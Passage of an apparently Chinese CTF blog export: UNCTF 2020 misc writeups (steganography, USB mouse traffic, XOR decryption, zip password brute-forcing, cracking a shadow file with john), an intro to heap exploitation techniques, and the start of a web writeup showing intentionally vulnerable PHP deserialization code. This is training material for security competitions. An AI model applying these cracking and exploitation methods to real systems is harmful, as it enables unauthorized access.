class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>.</span><br></pre></td></tr></table></figure></div>

<p>解密得到</p>
<p>flag{9_zhe_Jiu_zhe_8_hui_8}</p>
<h4 id="爷的历险记"><a href="#爷的历险记" class="headerlink" title="爷的历险记"></a>爷的历险记</h4><p>题目描述</p>
<blockquote>
<p>RPG小游戏 爷把flag弄丢了, 你可以帮他找回来吗</p>
</blockquote>
<p>下载附件是一个小游戏，真是快乐，出于玩的目的玩了半天</p>
<p>解题</p>
<p>游戏中存在商店，出售hint1,hint2,hint3，经过一番尝试，打过了几个小boss，但札师傅tql，打不过。于是便把目的转移到hint3。</p>
<p>当我们买到hint2时，给我们提示rpgsave：</p>
<p><img src="/images/unctf2020/hint2.png" alt=""></p>
<p>便去搜了一波，找到rpgsave文件的修改方式：</p>
<p><a href="http://web.save-editor.com/tool/rpg_tkool_mv.html" target="_blank" rel="noopener">http://web.save-editor.com/tool/rpg_tkool_mv.html</a></p>
<p><img src="/images/unctf2020/rpgsave.png" alt=""></p>
<p>于是我们选择我们文件的保存路径，将游戏的存档文件进行DECODE：</p>
<p>得到file1.rpgsave.txt，在这个txt文本中我们把金钱修改的大一点然后保存，再将这个txt文本进行上述链接的加密。最后替换掉存档中的file1文件即可。</p>
<p>我们发现，再次继续游戏时：</p>
<p><img src="/images/unctf2020/GG.png" alt=""></p>
<p>之后购买hint3得到flag</p>
<p>flag：UNCTF{WelC0me_70_UNCTF2oZ0~}</p>
<h4 id="躲猫猫"><a href="#躲猫猫" class="headerlink" title="躲猫猫"></a>躲猫猫</h4><p>题目描述</p>
<blockquote>
<p>我躲好了，你来找我</p>
</blockquote>
<p>下载题目附件，是一个xlsx后缀的Excel文件，直接打开的话，并没有任何显示。</p>
<p>根据题目所述，信息是隐藏的，使用binwalk直接进行分离，在分离出的压缩文件中找到</p>
<p><img src="/images/unctf2020/cat.png" alt=""></p>
<p>记事本打开直接搜索flag。</p>
<p>flag：unctf{7383b67de9106a6f10fdbe4e8ebc64ce}</p>
<h4 id="零"><a href="#零" class="headerlink" title="零"></a>零</h4><p>题目描述</p>
<blockquote>
<p>我瞎了看不到flag了</p>
</blockquote>
<p>打开附件</p>
<blockquote>
<p>‌‌‌‌‍﻿‍‍Neyxj dycs‌‌‌‌‍‬﻿‬ oush,ciuyh‌‌‌‌‍‬‌﻿ guheks bzudh ‌‌‌‌‍﻿‍‌msaksdh iygsch lasudl.Xucjd zuxjcy‌‌‌‌‍‬‍‬‌‌‌‌‍﻿‬﻿ ishch is‌‌‌‌‍﻿‌﻿ vusj.I‌‌‌‌‍﻿‬‍ suduy chis the chaie hunsh ‌‌‌‌‍‬‌﻿lin,lisnd ‌‌‌‌‍‬‬‬zsusy oiyub ‌‌‌‌‌﻿‌‬‌‌‌‌‌﻿‍‌muuyn are syenh ling.Jsudbh nec ‌‌‌‌‍‍﻿﻿orci no‌‌‌‌‌﻿‍‬ urna‌‌‌‌‍‬‬‌‌‌‌‌‍﻿‍‬ non‌‌‌‌‍‬‍﻿ ultricise,‌‌‌‌‍‬‬‬conseturen ‌‌‌‌‍‍﻿﻿in yeuseqr eund val‌‌‌‌‌﻿‬‌ will ping,churneo‌‌‌‌‍‬‍﻿ sudyens lzuebhs‌‌‌‌‍‬‍‬ poin‌‌‌‌‍‬‬‬ sudhen‌‌‌‌‍﻿﻿‍ .Yshebsn kash as zjehsn quis nunie lings zlinjen zune,shxuea zjhenbh suebn snchben zlings.</p>
</blockquote>
<p>看到题目，想到这样的字符串解密肯定跟零类字符有关，于是查到了零宽度字符解密</p>
<p>github有相关的解密网站：<a href="http://330k.github.io/misc_tools/unicode_steganography.html" target="_blank" rel="noopener">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<p>直接解密即可得到flag。</p>
<p><img src="/images/unctf2020/zero.png" alt=""></p>
<p>flag：unctf{sycj24_6hvgj_8gfj}</p>
<h4 id="mouse-click"><a href="#mouse-click" class="headerlink" title="mouse_click"></a>mouse_click</h4><p>下载题目是一个usb流量包，大致分析一下，知道这是个鼠标流量。</p>
<p><img src="/images/unctf2020/usb.png" alt=""></p>
<p>使用wireshark自带的tshark命令行工具，可以将 leftover capture data单独提取出来</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">tshark</span> <span class="selector-tag">-r</span> <span class="selector-tag">mouse_click</span><span class="selector-class">.pcapng</span> <span class="selector-tag">-T</span> <span class="selector-tag">fields</span> <span class="selector-tag">-e</span> <span class="selector-tag">usb</span><span class="selector-class">.capdata</span> &gt; <span class="selector-tag">usbdata</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure></div>

<p>我们去掉usbdata.txt里的空行得到形如这样的数据：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">00000100</span></span><br><span class="line"><span class="number">00f</span>f0100</span><br><span class="line"><span class="number">00f</span>f0100</span><br><span class="line"><span class="number">00f</span>f0200</span><br><span class="line"><span class="number">00f</span>f0200</span><br><span class="line"><span class="number">00f</span>f0100</span><br><span class="line"><span class="number">00000100</span></span><br><span class="line"><span class="number">00f</span>f0100</span><br><span class="line"><span class="number">00000100</span></span><br><span class="line"><span class="number">00000200</span></span><br><span class="line"><span class="number">00f</span>f0100</span><br><span class="line"><span class="number">00000200</span></span><br><span class="line"><span class="number">00f</span>f0100</span><br><span class="line"><span class="number">00000100</span></span><br><span class="line"><span class="number">00000100</span></span><br><span class="line"><span class="number">00000200</span></span><br><span class="line"><span class="number">00000100</span></span><br><span class="line"><span class="number">00000100</span></span><br><span class="line"><span class="number">00000100</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>然后我们需要编写脚本将数据包的内容变成一系列点的集合，为了区分左右按键，可以特意对第一个字节的内容作一下判断。相关脚本如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="comment">#author:As1def</span></span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">result=open(<span class="string">'result.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">  x = int(line[<span class="number">2</span>:<span class="number">4</span>],<span class="number">16</span>)</span><br><span class="line">  y = int(line[<span class="number">5</span>:<span class="number">7</span>],<span class="number">16</span>)</span><br><span class="line">  <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">    x -= <span class="number">256</span></span><br><span class="line">  <span class="keyword">if</span> y &gt;<span class="number">115</span> :</span><br><span class="line">    y -=<span class="number">256</span></span><br><span class="line">  posx += x</span><br><span class="line">  posy += y</span><br><span class="line">  btn_flag = int(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>) <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">  <span class="keyword">if</span> btn_flag == <span class="number">1</span> : <span class="comment"># 1 代表左键，2代表右键</span></span><br><span class="line">    result.write(str(posx)+<span class="string">' '</span>+str(-posy)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line">result.close()</span><br></pre></td></tr></table></figure></div>

<p>得到result.txt，数据大致为：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">-21</span> <span class="number">-848</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-944</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1056</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1264</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1328</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1344</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1376</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1392</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1408</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1424</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-1456</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-2144</span></span><br><span class="line"><span class="number">-22</span> <span class="number">-2176</span></span><br><span class="line"><span class="number">-21</span> <span class="number">-2192</span></span><br><span class="line"><span class="number">-20</span> <span class="number">-2208</span></span><br><span class="line"><span class="number">-19</span> <span class="number">-2224</span></span><br><span class="line"><span class="number">-19</span> <span class="number">-2224</span></span><br><span class="line"><span class="number">-18</span> <span class="number">-2240</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>得到这些点之后，需要将他们画出来，因而需要辅以gnuplot 或者其他的绘图工具。我这里使用的是gnuplot，命令为：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MATLAB"><figure class="iseeu highlight /matlab"><table><tr><td class="code"><pre><span class="line"><span class="built_in">plot</span> <span class="string">"result.txt"</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/images/unctf2020/gnuplot.png" alt=""></p>
<p>得到flag。</p>
<p>flag：unctf{U5BC@P}</p>
<h4 id="YLB绝密文件"><a href="#YLB绝密文件" class="headerlink" title="YLB绝密文件"></a>YLB绝密文件</h4><p>下载附件是一个流量包。</p>
<p>wireshark打开，筛选http流。</p>
<p>找到关键数据</p>
<p><img src="/images/unctf2020/py.png" alt=""></p>
<p>将这两个文件数据导出。x-python是一个名为xor.py的python脚本：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> key</span><br><span class="line">file = open(<span class="string">"YLBSB.docx"</span>, <span class="string">"rb"</span>)</span><br><span class="line">enc = open(<span class="string">"YLBSB.xor"</span>, <span class="string">"wb"</span>)</span><br><span class="line">plain = base64.b64encode(file.read())</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> plain:</span><br><span class="line">    d = chr(c ^ ord(key[count % len(key)]))</span><br><span class="line">    enc.write(d.encode())</span><br><span class="line">    count = count + <span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>另一个x-python-code是一个pyc文件：</p>
<p><img src="/images/unctf2020/pyc.png" alt=""></p>
<p>我们首先看这个py脚本，发现我们需要得到解密所需的key以及一个YLBSB.xor文件</p>
<p>在数据包中，http流还有一处存在一个zip文件。</p>
<p><img src="/images/unctf2020/zip.png" alt=""></p>
<p>将其导出得到YLBSB.zip，压缩包中就存放着我们需要的YLBSB.xor文件。</p>
<p>key值的获取就是我们把上面得到的pyc进行反编译，可得到key=’YLBSB?YLBNB!’</p>
<p>根据xor.py编写脚本，数据写入YLBSB.docx</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">#-*-codin<span class="variable">g:utf</span>-<span class="number">8</span>-*-</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">key = <span class="string">'YLBSB?YLBNB!'</span></span><br><span class="line">enc = <span class="keyword">open</span>(<span class="string">"YLBSB.xor"</span>, <span class="string">"rb"</span>)</span><br><span class="line"><span class="keyword">file</span> = <span class="keyword">open</span>(<span class="string">"YLBSB.txt"</span>, <span class="string">"wb"</span>)</span><br><span class="line">plain = enc.<span class="keyword">read</span>()</span><br><span class="line"><span class="built_in">count</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> <span class="keyword">c</span> in plain:</span><br><span class="line">  d = chr(<span class="keyword">c</span> ^ ord(key[<span class="built_in">count</span> % <span class="built_in">len</span>(key)]))</span><br><span class="line">  <span class="keyword">file</span>.<span class="keyword">write</span>(d.encode())</span><br><span class="line">  <span class="built_in">count</span> = <span class="built_in">count</span> + <span class="number">1</span></span><br><span class="line"><span class="keyword">file</span>.<span class="keyword">close</span>()</span><br><span class="line">enc.<span class="keyword">close</span>()</span><br><span class="line"><span class="keyword">file</span> = <span class="keyword">open</span>(<span class="string">"YLBSB.txt"</span>, <span class="string">"rb"</span>)</span><br><span class="line"><span class="keyword">files</span> = <span class="keyword">open</span>(<span class="string">"YLBSB.docx"</span>, <span class="string">"wb"</span>)</span><br><span class="line">plain = base64.b64decode(<span class="keyword">file</span>.<span class="keyword">read</span>())</span><br><span class="line"><span class="keyword">files</span>.<span class="keyword">write</span>(plain)</span><br></pre></td></tr></table></figure></div>

<p>得到docx文档，这个docx文档还挺有意思的，记述了YLB的详细流程…</p>
<p>在文档的最下方存在一段不可见字符，选中之后改变字体颜色，得到flag。</p>
<p><img src="/images/unctf2020/docx.png" alt=""></p>
<p>flag：UNCTF{Best_YLB_Ever}</p>
<h4 id="网络深处1"><a href="#网络深处1" class="headerlink" title="网络深处1"></a>网络深处1</h4><p>题目描述</p>
<blockquote>
<p>好孩子不要上洋葱鸭</p>
</blockquote>
<p>下载附件，得到</p>
<p><img src="/images/unctf2020/number.png" alt=""></p>
<p>首先看这个txt文本，描述所说zip文件的解压密码就是wav中的电话号码。</p>
<p>使用Audacity打开这个wav文件。选择频谱图</p>
<p><img src="/images/unctf2020/pinpu.png" alt=""></p>
<p>发现正好是十一段，对应电话号码的长度。对于这样的音频，网上有相关工具可以直接识别出电话号码。</p>
<p><a href="http://www.dialabc.com/sound/detect/index.html" target="_blank" rel="noopener">http://www.dialabc.com/sound/detect/index.html</a></p>
<p><img src="/images/unctf2020/DTMF.png" alt=""></p>
<p>得到电话号码为：15975384265</p>
<p>解密压缩包得到电话录音.wav和另一个txt文本。根据txt文本的内容我们需要找到wav文件里面的有用信息。</p>
<p>继续使用Audacity工具打开这个wav文件，调至频谱图得到：</p>
<p><img src="/images/unctf2020/tupper.png" alt=""></p>
<p>根据tupper这一信息，我们得到如下解密脚本：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="comment">#author:As1def</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Tupper_self_referential_formula</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">  size = <span class="number">17</span></span><br><span class="line">  k=<span class="number">636806841748368750477720528895492611039728818913495104112781919263174040060359776171712496606031373211949881779178924464798852002228370294736546700438210687486178492208471812570216381077341015321904079977773352308159585335376746026882907466893864815887274158732965185737372992697108862362061582646638841733361046086053127284900532658885220569350253383469047741742686730128763680253048883638446528421760929131783980278391556912893405214464624884824555647881352300550360161429758833657243131238478311219915449171358359616665570429230738621272988581871</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    d = ((-size * x) - (y % size))</span><br><span class="line">    e = reduce(<span class="keyword">lambda</span> x,y: x*y, [<span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(-d)]) <span class="keyword">if</span> d <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">    f = ((y / size) / e)</span><br><span class="line">    g = f % <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0.5</span> &lt; g</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> aa <span class="keyword">in</span> xrange(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(k+<span class="number">60</span>,k<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">      line = <span class="string">""</span></span><br><span class="line">      <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">107</span>*aa,<span class="number">107</span>*(aa+<span class="number">1</span>)):</span><br><span class="line">        <span class="keyword">if</span> f(x,y):</span><br><span class="line">          line +=<span class="string">"*"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          line += <span class="string">" "</span></span><br><span class="line">      <span class="keyword">print</span> line</span><br><span class="line"></span><br><span class="line">Tupper_self_referential_formula()</span><br></pre></td></tr></table></figure></div>

<p>运行得到：</p>
<p><img src="/images/unctf2020/detupper.png" alt=""></p>
<p>flag：flag{Y29pbA==}</p>
<h4 id="倒影"><a href="#倒影" class="headerlink" title="倒影"></a>倒影</h4><p>下载题目，解压出来一个倒影.exe文件。但并不能运行，记事本查看后发现，文件头是jpg格式的。</p>
<p>我们直接修改后缀为jpg，得到一张图片，接着使用十六进制编辑器查看</p>
<p><img src="/images/unctf2020/base.png" alt=""></p>
<p>发现了一大串base64编码的字符串，进行解密得到：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000</span>B4000000A500100010000000006050B405106D6A9EA24E5767106D7AD58AC22940106D7AD58AC229400081001000000000000200A0478747E27616C666000000000000000200000000000000420080000000910000005297D4535E1555E5C90000801000A000F32010B405B4ECC7E9889EDF1BA30C6FF71836EBCFE9A735EFD6E501CE14109505827764B69DC37C6E2E478747E27616C66600000080000000910000005297D4535E1555E5C90000801000A04030B405</span><br></pre></td></tr></table></figure></div>

<p>通过观察这段解密后的数据发现这其实是一个zip格式的逆数据。将其逆过来之后变为：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">504</span>B03040A00010800009C5E5551E5354D79250000001900000008000000666C61672E747874E2E6C73CD96B46772850590141EC105E6DFE537A9EFCBE63817FF6C03AB1FDE9889E7CCE4B504B01023F000A00010800009C5E5551E5354D792500000019000000080024000000000000002000000000000000666C61672E7478740A002000000000000100180004922CA85DA7D60104922CA85DA7D6017675E42AE9A6D601504B050600000000010001005A0000004B0000000000</span><br></pre></td></tr></table></figure></div>

<p>将这段数据作为十六进制数保存成zip文件</p>
<p>打开压缩包发现需要密码，采取zip压缩包密码爆破</p>
<p><img src="/images/unctf2020/baopo.png" alt=""></p>
<p>得到密码658745，解密压缩包，得到flag。</p>
<p>flag：UNCTF{Th13_Is_@_F1@G}</p>
<h4 id="被删除的flag"><a href="#被删除的flag" class="headerlink" title="被删除的flag"></a>被删除的flag</h4><p>题目描述</p>
<blockquote>
<p>flag被删除了，你能恢复它吗</p>
</blockquote>
<p>下载附件，得到名为flag的文件</p>
<p>这题不知道是不是有点问题，通过记事本打开就可以直接搜索flag</p>
<p>flag：unctf{congratulations!}</p>
<h4 id="你能破解我的密码吗"><a href="#你能破解我的密码吗" class="headerlink" title="你能破解我的密码吗"></a>你能破解我的密码吗</h4><p>题目是一个shadow文件，是linux中存放的shadow密码文件</p>
<p><img src="/images/unctf2020/shadow.png" alt=""></p>
<p>通过观察，除root以外登陆成功的只有guguguguji这一用户，我们需要的就是解密该账户后面的字符串。</p>
<p>linux中存在一个工具，可以解密shadow文件，命令为：john shadow</p>
<p><img src="/images/unctf2020/john.png" alt=""></p>
<p>得到密码为123456。最后加密md5得到flag。</p>
<p>flag：unctf{e10adc3949ba59abbe56e057f20f883e}</p>
<h4 id="EZ-IMAGE"><a href="#EZ-IMAGE" class="headerlink" title="EZ_IMAGE"></a>EZ_IMAGE</h4><p>题目是很多的图片块，需要进行拼图。</p>
<p>利用工具gaps。</p>
<p>首先我们需要将所有的图片整合成一张图片。利用代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PIL.Image <span class="keyword">as</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">IMAGES_PATH = <span class="string">'ez_image/'</span></span><br><span class="line">IMAGE_SIZE = (<span class="number">60</span>, <span class="number">60</span>) <span class="comment"># 每张小图片的大小</span></span><br><span class="line">IMAGE_ROW = <span class="number">15</span> <span class="comment"># 大图行数</span></span><br><span class="line">IMAGE_COLUMN = <span class="number">15</span> <span class="comment"># 大图列数</span></span><br><span class="line">IMAGE_SAVE_PATH = <span class="string">'final.jpg'</span> <span class="comment"># 图片转换后的地址</span></span><br><span class="line"></span><br><span class="line">image_names = os.listdir(IMAGES_PATH) <span class="comment"># 获取图片集地址下的所有图片名称</span></span><br><span class="line">image_names.sort() <span class="comment"># 排序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(image_names) != IMAGE_ROW * IMAGE_COLUMN:</span><br><span class="line">  <span class="keyword">raise</span> ValueError(<span class="string">"合成图片的参数和要求的数量不能匹配！"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">image_compose</span><span class="params">()</span>:</span></span><br><span class="line">  to_image = Image.new(<span class="string">'RGB'</span>, (IMAGE_COLUMN * IMAGE_SIZE[<span class="number">0</span>], IMAGE_ROW * IMAGE_SIZE[<span class="number">1</span>])) <span class="comment">#创建一个新图</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>, IMAGE_ROW + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, IMAGE_COLUMN + <span class="number">1</span>):</span><br><span class="line">      from_image = Image.open(IMAGES_PATH + image_names[IMAGE_COLUMN * (y - <span class="number">1</span>) + x - <span class="number">1</span>]).resize(</span><br><span class="line">        (IMAGE_SIZE[<span class="number">0</span>], IMAGE_SIZE[<span class="number">1</span>]),Image.ANTIALIAS)</span><br><span class="line">      to_image.paste(from_image, ((x - <span class="number">1</span>) * IMAGE_SIZE[<span class="number">0</span>], (y - <span class="number">1</span>) * IMAGE_SIZE[<span class="number">1</span>]))</span><br><span class="line">  <span class="keyword">return</span> to_image.save(IMAGE_SAVE_PATH) </span><br><span class="line"></span><br><span class="line">image_compose()</span><br></pre></td></tr></table></figure></div>

<p>整合好的图片如下：</p>
<p><img src="/images/unctf2020/final.png" alt=""></p>
<p>接着使用gaps工具进行拼图。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">gaps –<span class="attribute">image</span>=final.jpg –<span class="attribute">generations</span>=50 –<span class="attribute">population</span>=225 –<span class="attribute">size</span>=60</span><br></pre></td></tr></table></figure></div>

<p>得到拼好的图片：</p>
<p><img src="/images/unctf2020/ok.png" alt=""></p>
<p>flag：UNCTF{EZ_MISC_AND_HACK_FUN}</p>
<h4 id="撕坏的二维码"><a href="#撕坏的二维码" class="headerlink" title="撕坏的二维码"></a>撕坏的二维码</h4><p>题目是一个不太完整的二维码，正常来说需要进行修复，但这个我们通过qrcode直接进行扫描就得到了flag。</p>
<p><img src="/images/unctf2020/QRCode.png" alt=""></p>
<p>flag：unctf{QR@2yB0x}</p>
]]></content>
      <tags>
        <tag>UNCTF</tag>
        <tag>writewp</tag>
      </tags>
  </entry>
  <entry>
    <title>堆的几种利用手法</title>
    <url>/2020/08/24/%E5%A0%86%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/</url>
    <content><![CDATA[<p>对基于堆的常见漏洞利用方式，包括libc的基地址泄露，UAF，fastbin attack、Unlink和off By One进行了一些梳理，也包含了一些调试过程。</p>
<a id="more"></a>

<h3 id="leak-libc的几种常见方式"><a href="#leak-libc的几种常见方式" class="headerlink" title="leak_libc的几种常见方式"></a>leak_libc的几种常见方式</h3><p>在堆题中几乎不会出现含有后门函数直接getshell的情况，这时可以采取的一种对策也是通过泄露libc的基址，进而计算得到system或其他函数的实际地址，下面总结一些常见泄露地址的方法：</p>
<p>（一）泄露main_arena地址</p>
<p>漏洞原理：当我们free一个small_chunk的时候，如果此时fastbin为空，那么我们的small_chunk就会加入unsorted_bin中，而unsorted_bin中free_chunk的fd和bk指向了main_arena中的位置，这样如果存在类似UAF等漏洞，可以实现在free small_chunk后再次打印small_chunk的内容也即fd指针，就能够实现泄露main_arena的实际地址。</p>
<p>利用条件：</p>
<p>（1）能够申请到small chunk大小范围内的内存块</p>
<p>（2）能够结合其他漏洞点（UAF或double free等）实现泄露释放后内存块的内容</p>
<p>（3）释放的内存块不是当前在堆上申请的最后一个内存块</p>
<p>（4）释放small chunk时，fastbins数组为空</p>
<p>题目：buuoj——jarvisoj_itemboard(<a href="https://github.com/As1def/ctf-challenges/tree/master/pwn/Jarvisoj/itemboard" target="_blank" rel="noopener">附件</a>)</p>
]]></content>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title>津门杯-Web-Writeup</title>
    <url>/2021/05/11/%E6%B4%A5%E9%97%A8%E6%9D%AF-Web-Writeup/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2021/05/11/2QSAKiMXmatypsE.png" alt="image-20210511110410892"></p>
<a id="more"></a>

<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="power-cut"><a href="#power-cut" class="headerlink" title="power_cut"></a>power_cut</h4><p>网站存在vim文件泄露，拿到index.php.swp文件</p>
<p><code>vim -r index.php.swp</code>读取源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//vim -r index.php.swp</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">logger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $logFile;</span><br><span class="line">    <span class="keyword">public</span> $initMsg;</span><br><span class="line">    <span class="keyword">public</span> $exitMsg;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">    <span class="comment">// initialise variables</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;initMsg=<span class="string">"#--session started--#\n"</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;exitMsg=<span class="string">"#--session end--#\n"</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logFile =  $file;</span><br><span class="line">    readfile(<span class="keyword">$this</span>-&gt;logFile);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span><span class="params">($msg)</span></span>&#123;</span><br><span class="line">    $fd=fopen(<span class="keyword">$this</span>-&gt;logFile,<span class="string">"a+"</span>);</span><br><span class="line">    fwrite($fd,$msg.<span class="string">"\n"</span>);</span><br><span class="line">    fclose($fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"this is destruct"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">weblog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $weblogfile;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $flag=<span class="string">"system('cat /flag')"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// self::waf($this-&gt;filepath);</span></span><br><span class="line">    $obj = <span class="keyword">new</span> logger(<span class="keyword">$this</span>-&gt;weblogfile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $str=preg_replace(<span class="string">"/[&lt;&gt;*#'|?\n ]/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str=str_replace(<span class="string">'flag'</span>,<span 